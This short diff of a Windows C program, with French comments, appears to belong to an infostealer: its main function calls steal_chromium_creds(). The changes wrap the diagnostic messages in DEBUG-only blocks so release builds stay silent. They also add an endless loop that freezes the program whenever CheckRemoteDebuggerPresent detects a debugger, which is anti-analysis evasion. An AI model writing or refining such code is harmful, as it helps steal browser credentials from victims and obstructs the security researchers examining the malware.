@@ -20,16 +20,22 @@ int main(void) {
 
   if (CheckRemoteDebuggerPresent(hProcess, &isDebuggerPresent)) {
     if (isDebuggerPresent) {
+#ifdef DEBUG
       printf("Un débogueur est détecté sur ce processus.\n");
+#endif
+      while (1);
     } else {
+#ifdef DEBUG
       printf("Aucun débogueur n'est détecté sur ce processus.\n");
+#endif
     }
   } else {
-    // En cas d'échec, afficher l'erreur
+#ifdef DEBUG
     printf(
         "Erreur lors de l'appel à CheckRemoteDebuggerPresent. Code d'erreur : "
         "%lu\n",
         GetLastError());
+#endif
   }
 
   steal_chromium_creds();
